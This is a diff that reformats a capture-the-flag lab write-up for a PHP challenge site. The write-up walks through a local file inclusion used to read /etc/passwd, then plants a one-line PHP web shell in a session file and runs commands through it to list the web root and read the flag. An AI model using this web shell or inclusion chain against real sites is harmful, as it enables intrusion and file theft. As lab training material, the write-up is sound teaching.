@@ -14,8 +14,7 @@ Challenge: https://windows.ctf.zoolab.org/
 Very similar to [0x07(Lab - `HakkaMD`)](/nGAjlvyURtOcRBW1XfCfOA)
 
 ## Source code
-:::spoiler code
-```php!=
+```php
  <?php
   session_start();
   if(isset($_GET['source'])){
@@ -71,27 +70,35 @@ Very similar to [0x07(Lab - `HakkaMD`)](/nGAjlvyURtOcRBW1XfCfOA)
 </html>
 
 ```
-:::
 
 ## Exploit - LFI to RCE
 1. First things first, the website has `LFI` problem
-`https://windows.ctf.zoolab.org/?page=/etc/passwd`
-![](https://i.imgur.com/2BHfWtQ.png)
+  ```
+  https://windows.ctf.zoolab.org/?page=/etc/passwd
+  ```
+  ![](https://i.imgur.com/2BHfWtQ.png)
 
-2. <font color="FF0000">**通靈**</font>
-It didn't provide any information about system, so we can assume the setting is default at first.
+2. <font color="FF0000">通靈</font>: It didn't provide any information about system, so we can assume the setting is default at first.
 
 3. `webshell`
-`<?php system($_GET['sh']); ?>`
-↓
-We use `LFI` to read session file:
-`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829`
-![](https://i.imgur.com/gAnKZGF.png)
-It execute system function successfully.
-↓
-`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=ls%20/var/www/html`
-↓
-![](https://i.imgur.com/JOOmyyl.png)
-↓
-`https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=cat%20/var/www/html/flag.txt`
+  ```
+  <?php system($_GET['sh']); ?>
+  ```
+  ↓
+  We use `LFI` to read session file:
+  ```
+  https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829
+  ```
+  ![](https://i.imgur.com/gAnKZGF.png)
+  It execute system function successfully.
+  ↓
+  ```
+  https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=ls%20/var/www/html
+  ```
+  ↓
+  ![](https://i.imgur.com/JOOmyyl.png)
+  ↓
+  ```
+  https://windows.ctf.zoolab.org/?page=/tmp/sess_995c0ecc84473170723e595f9f4b8829&sh=cat%20/var/www/html/flag.txt
+  ```
 4. Then we got flag!!!
